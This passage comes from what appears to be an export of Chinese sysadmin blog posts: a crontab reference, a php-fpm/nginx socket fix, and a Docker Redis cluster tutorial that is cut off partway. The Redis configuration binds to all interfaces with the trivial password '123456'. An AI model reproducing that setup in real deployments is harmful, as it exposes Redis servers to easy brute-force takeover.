</div>", "log_PostTime": 1584891265, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Linux crontab 命令基本说明", "log_Intro": "Linux crontab 命令基本说明", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>Linux crontab是用来定期执行程序的命令。</p>\n\n<p>当安装完成操作系统之后，默认便会启动此任务调度命令。</p>\n\n<p>crond 命令每分锺会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</p>\n\n<p>而 linux 任务调度的工作主要分为以下两类：</p>\n\n<ul><li>1、系统执行的工作：系统周期性所要执行的工作，如备份系统数据、清理缓存</li>\n\t<li>2、个人执行的工作：某个用户定期要做的工作，例如每隔10分钟检查邮件服务器是否有新信，这些工作可由每个用户自行设置</li>\n</ul><h3>语法</h3>\n\n<pre>\ncrontab [ -u user ] file</pre>\n\n<p>或</p>\n\n<pre>\ncrontab [ -u user ] { -l | -r | -e }</pre>\n\n<p><strong>说明：</strong></p>\n\n<p>crontab 是用来让使用者在固定时间或固定间隔执行程序之用，换句话说，也就是类似使用者的时程表。</p>\n\n<p>-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。</p>\n\n<p><strong>参数说明</strong>：</p>\n\n<ul><li>-e : 执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)</li>\n\t<li>-r : 删除目前的时程表</li>\n\t<li>-l : 列出目前的时程表</li>\n</ul><p>时间格式如下：</p>\n\n<pre>\nf1 f2 f3 f4 f5 program</pre>\n\n<ul><li>其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。</li>\n\t<li>当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推</li>\n\t<li>当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推</li>\n\t<li>当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推</li>\n\t<li>当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行，其馀类推</li>\n</ul><pre>\n*    *    *    *    *\n-    -    -    -    -\n|    |    |    |    |\n|    |    |    |    +----- 星期中星期几 (0 - 7) (星期天 为0)\n|    |    |    +---------- 月份 (1 - 12) \n|    |    +--------------- 一个月中的第几天 (1 - 31)\n|    +-------------------- 小时 (0 - 23)\n+------------------------- 分钟 (0 - 59)</pre>\n\n<p>使用者也可以将所有的设定先存放在文件中，用 crontab file 的方式来设定执行时间。</p>\n\n<h3>实例</h3>\n\n<p>每月每天每小时的第 0 分钟执行一次 /bin/ls</p>\n\n<pre>\n0 * * * * /bin/ls</pre>\n\n<p>在 12 月内, 每天的早上 6 点到 12 点，每隔 3 个小时 0 分钟执行一次 /usr/bin/backup</p>\n\n<pre>\n0 6-12/3 * 12 * /usr/bin/backup</pre>\n\n<p>周一到周五每天下午 5:00 寄一封信给 alex@domain.name</p>\n\n<pre>\n0 17 * * 1-5 mail -s \"hi\" alex@domain.name &lt; /tmp/maildata</pre>\n\n<p>每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分....执行 echo \"haha\"</p>\n\n<pre>\n20 0-23/2 * * * echo \"haha\"</pre>\n\n<p>下面再看看几个具体的例子：</p>\n\n<pre>\n0 */2 * * * /sbin/service httpd restart  意思是每两个小时重启一次apache \n\n50 7 * * * /sbin/service sshd start  意思是每天7：50开启ssh服务 \n\n50 22 * * * /sbin/service sshd stop  意思是每天22：50关闭ssh服务 \n\n0 0 1,15 * * fsck /home  每月1号和15号检查/home 磁盘 \n\n1 * * * * /home/bruce/backup  每小时的第一分执行 /home/bruce/backup这个文件 \n\n00 03 * * 1-5 find /home \"*.xxx\" -mtime +4 -exec rm {} \\;  每周一至周五3点钟，在目录/home中，查找文件名为*.xxx的文件，并删除4天前的文件。\n\n30 6 */10 * * ls  意思是每月的1、11、21、31日是的6：30执行一次ls命令</pre>\n\n<p><strong>注意：</strong>当程序在你所指定的时间执行后，系统会寄一封信给你，显示该程序执行的内容，若是你不希望收到这样的信，请在每一行空一格之后加上 &gt; /dev/null 2&gt;&amp;1 即可</p>\n                                    </div>", "log_PostTime": 1584891266, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "php-fpm开启报错-ERROR: An another FPM instance seems to already listen on /tmp/php-cgi.sock", "log_Intro": "php-fpm开启报错-ERROR: An another FPM instance seems to already listen on /tmp/php-cgi.sock", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>在升级了php7.3.2版本之后，重新启动php-fpm过程中遇到一个报错。</p>\n\n<p><img alt=\"\" class=\"has\" height=\"108\" src=\"https://img-blog.csdnimg.cn/20200101225438299.png\" width=\"675\"></p>\n\n<pre>\n An another FPM instance seems to already listen on /tmp/php-cgi.sock\n</pre>\n\n<pre class=\"has\">\n<code>netstat -ant | grep 9000  //查看启动进程，发现没启动成功</code></pre>\n\n<p>我们去查看一下php-fpm.conf里面的配置：</p>\n\n<pre class=\"has\">\n<code>vim  /usr/local/php/etc/php-fpm.conf</code></pre>\n\n<pre>\n[www]\nlisten = /tmp/php-cgi.sock   //注意\nlisten.backlog = -1\nlisten.allowed_clients = 127.0.0.1\nlisten.owner = www\nlisten.group = www</pre>\n\n<p>此时我们需要根据配置文件的listen地址做对应的修改：</p>\n\n<pre>\n# vim /usr/local/nginx/conf/nginx.conf</pre>\n\n<pre>\nlocation ~ [^/]\\.php(/|$) {\n       fastcgi_pass unix:/tmp/php-cgi.sock;    //把127.0.0.1:9000改为此行\n       fastcgi_index index.php;\n       fastcgi_param SCRIPT_FILENAME     $document_root$fastcgi_script_name;\n       include fastcgi_params;\n}\nlocation / {\n      root   html;\n      index index.php index.html index.htm;\n}</pre>\n\n<p>修改完平滑重启nginx，然后启动php-fpm，OK</p>\n                                    </div>", "log_PostTime": 1584891268, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "docker 实现redis集群搭建", "log_Intro": "docker 实现redis集群搭建", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>摘要</strong>：接触docker以来，似乎养成了一种习惯，安装什么应用软件都想往docker方向做，今天就想来尝试下使用docker搭建redis集群。</p>\n\n<p>首先，我们需要理论知识：<code>Redis Cluster</code>是<code>Redis</code>的分布式解决方案，它解决了redis单机中心化的问题，分布式数据库——首要解决把整个数据集按照分区规则映射到多个节点的问题。</p>\n\n<p>这边就需要知道分区规则——哈希分区规则。<code>Redis Cluster </code>采用哈希分区规则中的虚拟槽分区。所有的键根据哈希函数映射到<code>0 ～ 16383</code>，计算公式：<code>slot = CRC16(key)&amp;16383</code>。每一个节点负责维护一部分槽以及槽所映射的键值数据。</p>\n\n<h1>一、创建redis docker基础镜像</h1>\n\n<ol><li>下载redis安装包，使用版本为：4.0.1\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd1 tmp]</code><code># mkdir docker_redis_cluster</code></p>\n\n\t\t\t\t<p><code>[root@etcd1 tmp]</code><code># cd docker_redis_cluster/</code></p>\n\n\t\t\t\t<p><code>[root@etcd2 docker_redis_cluster]</code><code># wget http://download.redis.io/releases/redis-4.0.1.tar.gz</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table></li>\n\t<li>解压编译redis\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd1 docker_redis_cluster]</code><code># tar zxvf redis-4.0.1.tar.gz</code></p>\n\n\t\t\t\t<p><code>[root@etcd1 docker_redis_cluster]</code><code># cd redis-4.0.1/</code></p>\n\n\t\t\t\t<p><code>[root@etcd1 redis-4.0.1]</code><code># make</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table></li>\n\t<li>修改redis配置\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd3 redis-4.0.1]</code><code># vi /tmp/docker_redis_cluster/redis-4.0.1/redis.conf</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t修改bind ip地址</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\n\t\t\t\t<p>13</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code># ~~~ WARNING ~~~ If the computer running Redis is directly exposed to the</code></p>\n\n\t\t\t\t<p><code># internet, binding to all the interfaces is dangerous and will expose the</code></p>\n\n\t\t\t\t<p><code># instance to everybody on the internet. So by default we uncomment the</code></p>\n\n\t\t\t\t<p><code># following bind directive, that will force Redis to listen only into</code></p>\n\n\t\t\t\t<p><code># the IPv4 lookback interface address (this means Redis will be able to</code></p>\n\n\t\t\t\t<p><code># accept connections only from clients running into the same computer it</code></p>\n\n\t\t\t\t<p><code># is running).</code></p>\n\n\t\t\t\t<p><code>#</code></p>\n\n\t\t\t\t<p><code># IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES</code></p>\n\n\t\t\t\t<p><code># JUST COMMENT THE FOLLOWING LINE.</code></p>\n\n\t\t\t\t<p><code># ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</code></p>\n\n\t\t\t\t<p><code>#bind 127.0.0.1</code></p>\n\n\t\t\t\t<p><code>bind 0.0.0.0</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　</p>\n\n\t<p>将守护进程yes改成no</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code># By default Redis does not run as a daemon. Use 'yes' if you need it.</code></p>\n\n\t\t\t\t<p><code># Note that Redis will write a pid file in /var/run/redis.pid when daemonized.</code></p>\n\n\t\t\t\t<p><code>daemonize no</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t将密码项注释去掉，添加新密码</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code># Warning: since Redis is pretty fast an outside user can try up to</code></p>\n\n\t\t\t\t<p><code># 150k passwords per second against a good box. This means that you should</code></p>\n\n\t\t\t\t<p><code># use a very strong password otherwise it will be very easy to break.</code></p>\n\n\t\t\t\t<p><code>#</code></p>\n\n\t\t\t\t<p><code># requirepass foobared</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　修改为</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code># Warning: since Redis is pretty fast an outside user can try up to</code></p>\n\n\t\t\t\t<p><code># 150k passwords per second against a good box. This means that you should</code></p>\n\n\t\t\t\t<p><code># use a very strong password otherwise it will be very easy to break.</code></p>\n\n\t\t\t\t<p><code>#</code></p>\n\n\t\t\t\t<p><code>requirepass 123456</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p><br>\n\t因为配置了密码，所以，配置中另外一处主从连接也需要配置密码</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code># If the master is password protected (using the \"requirepass\" configuration</code></p>\n\n\t\t\t\t<p><code># directive below) it is possible to tell the slave to authenticate before</code></p>\n\n\t\t\t\t<p><code># starting the replication synchronization process, otherwise the master will</code></p>\n\n\t\t\t\t<p><code># refuse the slave request.</code></p>\n\n\t\t\t\t<p><code>#</code></p>\n\n\t\t\t\t<p><code># masterauth &lt;master-password&gt;</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　修改为</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code># If the master is password protected (using the \"requirepass\" configuration</code></p>\n\n\t\t\t\t<p><code># directive below) it is possible to tell the slave to authenticate before</code></p>\n\n\t\t\t\t<p><code># starting the replication synchronization process, otherwise the master will</code></p>\n\n\t\t\t\t<p><code># refuse the slave request.</code></p>\n\n\t\t\t\t<p><code>#</code></p>\n\n\t\t\t\t<p><code># masterauth &lt;master-password&gt;</code></p>\n\n\t\t\t\t<p><code>masterauth 123456</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　</p>\n\n\t<p>　　<br><br>\n\t设置日志路径</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code># Specify the log file name. Also the empty string can be used to force</code></p>\n\n\t\t\t\t<p><code># Redis to log on the standard output. Note that if you use standard</code></p>\n\n\t\t\t\t<p><code># output for logging but daemonize, logs will be sent to /dev/null</code></p>\n\n\t\t\t\t<p><code>logfile </code><code>\"/var/log/redis/redis-server.log\"</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t配置集群相关信息，去掉配置项前面的注释</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\n\t\t\t\t<p>13</p>\n\n\t\t\t\t<p>14</p>\n\n\t\t\t\t<p>15</p>\n\n\t\t\t\t<p>16</p>\n\n\t\t\t\t<p>17</p>\n\n\t\t\t\t<p>18</p>\n\n\t\t\t\t<p>19</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code># Normal Redis instances can't be part of a Redis Cluster; only nodes that are</code></p>\n\n\t\t\t\t<p><code># started as cluster nodes can. In order to start a Redis instance as a</code></p>\n\n\t\t\t\t<p><code># cluster node enable the cluster support uncommenting the following:</code></p>\n\n\t\t\t\t<p><code>#</code></p>\n\n\t\t\t\t<p><code>cluster-enabled </code><code>yes</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code># Every cluster node has a cluster configuration file. This file is not</code></p>\n\n\t\t\t\t<p><code># intended to be edited by hand. It is created and updated by Redis nodes.</code></p>\n\n\t\t\t\t<p><code># Every Redis Cluster node requires a different cluster configuration file.</code></p>\n\n\t\t\t\t<p><code># Make sure that instances running in the same system do not have</code></p>\n\n\t\t\t\t<p><code># overlapping cluster configuration file names.</code></p>\n\n\t\t\t\t<p><code>#</code></p>\n\n\t\t\t\t<p><code>cluster-config-</code><code>file</code> <code>nodes-6379.conf</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code># Cluster node timeout is the amount of milliseconds a node must be unreachable</code></p>\n\n\t\t\t\t<p><code># for it to be considered in failure state.</code></p>\n\n\t\t\t\t<p><code># Most other internal time limits are multiple of the node timeout.</code></p>\n\n\t\t\t\t<p><code>#</code></p>\n\n\t\t\t\t<p><code>cluster-node-timeout 15000</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table></li>\n\t<li>镜像制作\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\n\t\t\t\t<p>13</p>\n\n\t\t\t\t<p>14</p>\n\n\t\t\t\t<p>15</p>\n\n\t\t\t\t<p>16</p>\n\n\t\t\t\t<p>17</p>\n\n\t\t\t\t<p>18</p>\n\n\t\t\t\t<p>19</p>\n\n\t\t\t\t<p>20</p>\n\n\t\t\t\t<p>21</p>\n\n\t\t\t\t<p>22</p>\n\n\t\t\t\t<p>23</p>\n\n\t\t\t\t<p>24</p>\n\n\t\t\t\t<p>25</p>\n\n\t\t\t\t<p>26</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd3 docker_redis_cluster]</code><code># cd /tmp/docker_redis_cluster</code></p>\n\n\t\t\t\t<p><code>[root@etcd3 docker_redis_cluster]</code><code># vi Dockerfile</code></p>\n\n\t\t\t\t<p><code># Redis</code></p>\n\n\t\t\t\t<p><code># Version 4.0.1</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>FROM Centos:7&lt;br&gt;</code></p>\n\n\t\t\t\t<p><code>ENV REDIS_HOME </code><code>/usr/local</code><code>&lt;br&gt;</code></p>\n\n\t\t\t\t<p><code>ADD redis-4.0.1.</code><code>tar</code><code>.gz / </code><code># 本地的redis源码包复制到镜像的根路径下，ADD命令会在复制过后自动解包。被复制的对象必须处于Dockerfile同一路径，且ADD后面必须使用相对路径</code></p>\n\n\t\t\t\t<p><code>RUN </code><code>mkdir</code> <code>-p $REDIS_HOME</code><code>/redis</code> <code># 创建安装目录</code></p>\n\n\t\t\t\t<p><code>ADD redis-4.0.1</code><code>/redis</code><code>.conf $REDIS_HOME</code><code>/redis/</code>  <code># 将一开始编译产生并修改后的配置复制到安装目录</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>RUN yum -y update  </code><code># 更新yum源</code></p>\n\n\t\t\t\t<p><code>RUN yum </code><code>install</code> <code>-y </code><code>gcc</code> <code>make</code> <code># 安装编译需要的工具</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>WORKDIR </code><code>/redis-4</code><code>.0.1</code></p>\n\n\t\t\t\t<p><code>RUN </code><code>make</code></p>\n\n\t\t\t\t<p><code>RUN </code><code>mv</code> <code>/redis-4</code><code>.0.1</code><code>/src/redis-server</code>  <code>$REDIS_HOME</code><code>/redis/</code>   <code># 编译后，容器中只需要可执行文件redis-server</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>WORKDIR /</code></p>\n\n\t\t\t\t<p><code>RUN </code><code>rm</code> <code>-rf </code><code>/redis-4</code><code>.0.1          </code><code># 删除解压文件</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>RUN yum remove -y </code><code>gcc</code> <code>make</code>   <code># 安装编译完成之后，可以删除多余的gcc跟make</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>VOLUME [</code><code>\"/var/log/redis\"</code><code>]  </code><code># 添加数据卷</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>EXPOSE 6379   </code><code># 暴露6379端口，也可以暴露多个端口，这里不需要如此</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\tPS.当前镜像非可执行镜像，所以没有包含ENTRYPOINT和CMD指令</p>\n\t</li>\n\t<li>构建镜像\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\n\t\t\t\t<p>13</p>\n\n\t\t\t\t<p>14</p>\n\n\t\t\t\t<p>15</p>\n\n\t\t\t\t<p>16</p>\n\n\t\t\t\t<p>17</p>\n\n\t\t\t\t<p>18</p>\n\n\t\t\t\t<p>19</p>\n\n\t\t\t\t<p>20</p>\n\n\t\t\t\t<p>21</p>\n\n\t\t\t\t<p>22</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code># 切换中国源</code></p>\n\n\t\t\t\t<p><code>[root@etcd3 docker_redis_cluster]</code><code># vi /etc/docker/daemon.json</code></p>\n\n\t\t\t\t<p><code>{</code></p>\n\n\t\t\t\t<p><code>  </code><code>\"registry-mirrors\"</code><code>: [</code><code>\"https://registry.docker-cn.com\"</code><code>]</code></p>\n\n\t\t\t\t<p><code>}</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code># 编译</code></p>\n\n\t\t\t\t<p><code>[root@etcd3 docker_redis_cluster]</code><code># docker build -t hakimdstx/cluster-redis .</code></p>\n\n\t\t\t\t<p><code>...</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>Complete!</code></p>\n\n\t\t\t\t<p><code> </code><code>---&gt; 546cb1d34f35</code></p>\n\n\t\t\t\t<p><code>Removing intermediate container 6b6556c5f28d</code></p>\n\n\t\t\t\t<p><code>Step 14</code><code>/15</code> <code>: VOLUME </code><code>/var/log/redis</code></p>\n\n\t\t\t\t<p><code> </code><code>---&gt; Running </code><code>in</code> <code>05a6642e4046</code></p>\n\n\t\t\t\t<p><code> </code><code>---&gt; e7e2fb8676b2</code></p>\n\n\t\t\t\t<p><code>Removing intermediate container 05a6642e4046</code></p>\n\n\t\t\t\t<p><code>Step 15</code><code>/15</code> <code>: EXPOSE 6379</code></p>\n\n\t\t\t\t<p><code> </code><code>---&gt; Running </code><code>in</code> <code>5d7abe1709e2</code></p>\n\n\t\t\t\t<p><code> </code><code>---&gt; 2d1322475f79</code></p>\n\n\t\t\t\t<p><code>Removing intermediate container 5d7abe1709e2</code></p>\n\n\t\t\t\t<p><code>Successfully built 2d1322475f79</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t镜像制作完成，制作中间可能会报： Public key for glibc-headers-2.17-222.el7.x86_64.rpm is not installed 错误，这时候需要在镜像配置中添加一句命令：</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>...</code></p>\n\n\t\t\t\t<p><code>RUN rpm --</code><code>import</code> <code>/etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</code></p>\n\n\t\t\t\t<p><code>RUN yum -y update  </code><code># 更新yum源</code></p>\n\n\t\t\t\t<p><code>RUN yum </code><code>install</code> <code>-y </code><code>gcc</code> <code>make</code> <code># 安装编译需要的工具</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><br>\n\t查看镜像：\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd3 docker_redis_cluster]</code><code># docker images</code></p>\n\n\t\t\t\t<p><code>REPOSITORY                                  TAG                 IMAGE ID            CREATED             SIZE</code></p>\n\n\t\t\t\t<p><code>hakimdstx</code><code>/cluster-redis</code>                     <code>4.0.1               1fca5a08a4c7        14 seconds ago      435 MB</code></p>\n\n\t\t\t\t<p><code>centos                                      7                   49f7960eb7e4        2 days ago          200 MB</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　</p>\n\t以上，redis 基础镜像就制作完成了</li>\n</ol><h1>二、制作redis节点镜像</h1>\n\n<ol><li>基于此前制作的redis基础镜像创建一个redis节点镜像\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd3 tmp]</code><code># mkdir docker_redis_nodes</code></p>\n\n\t\t\t\t<p><code>[root@etcd3 tmp]</code><code># cd docker_redis_nodes</code></p>\n\n\t\t\t\t<p><code>[root@etcd3 docker_redis_nodes]</code><code># vi Dockerfile</code></p>\n\n\t\t\t\t<p><code># Redis Node</code></p>\n\n\t\t\t\t<p><code># Version 4.0.1&lt;br&gt;</code></p>\n\n\t\t\t\t<p><code>FROM hakimdstx</code><code>/cluster-redis</code><code>:4.0.1</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code># MAINTAINER_INFO</code></p>\n\n\t\t\t\t<p><code>MAINTAINER hakim 1194842583@qq.com</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>ENTRYPOINT [</code><code>\"/usr/local/redis/redis-server\"</code><code>, </code><code>\"/usr/local/redis/redis.conf\"</code><code>]</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　</p>\n\t</li>\n\t<li>构建redis节点镜像\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\n\t\t\t\t<p>13</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd3 docker_redis_nodes]</code><code># docker build -t hakimdstx/nodes-redis:4.0.1 .      </code></p>\n\n\t\t\t\t<p><code>Sending build context to Docker daemon 2.048 kB</code></p>\n\n\t\t\t\t<p><code>Step 1</code><code>/3</code> <code>: FROM hakimdstx</code><code>/cluster-redis</code><code>:4.0.1</code></p>\n\n\t\t\t\t<p><code> </code><code>---&gt; 1fca5a08a4c7</code></p>\n\n\t\t\t\t<p><code>Step 2</code><code>/3</code> <code>: MAINTAINER hakim 1194842583@qq.com</code></p>\n\n\t\t\t\t<p><code> </code><code>---&gt; Running </code><code>in</code> <code>cc6e07eb2c36</code></p>\n\n\t\t\t\t<p><code> </code><code>---&gt; 55769d3bfacb</code></p>\n\n\t\t\t\t<p><code>Removing intermediate container cc6e07eb2c36</code></p>\n\n\t\t\t\t<p><code>Step 